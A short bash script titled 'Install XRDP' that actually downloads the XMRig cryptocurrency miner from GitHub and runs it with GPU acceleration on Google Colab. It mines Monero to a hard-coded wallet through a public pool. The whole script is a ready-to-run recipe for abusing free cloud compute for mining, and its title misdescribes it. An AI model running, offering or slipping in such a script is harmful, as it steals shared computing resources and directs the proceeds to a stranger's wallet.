#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-bionic-x64.tar.gz
tar xvzf xmrig-6.17.0-bionic-x64.tar.gz
cd xmrig-6.17.0
./xmrig --cuda -o us-west.minexmr.com:443 -u 49h57kzn6DqHApw2K2kk17dVNzopMXv6He26fT2VbAUuYFE5AayymD1dYYQeeGrAw9JAsmHKHkwCJDP331k6fKV2PLe7TNa -k --tls --rig-id GC-1
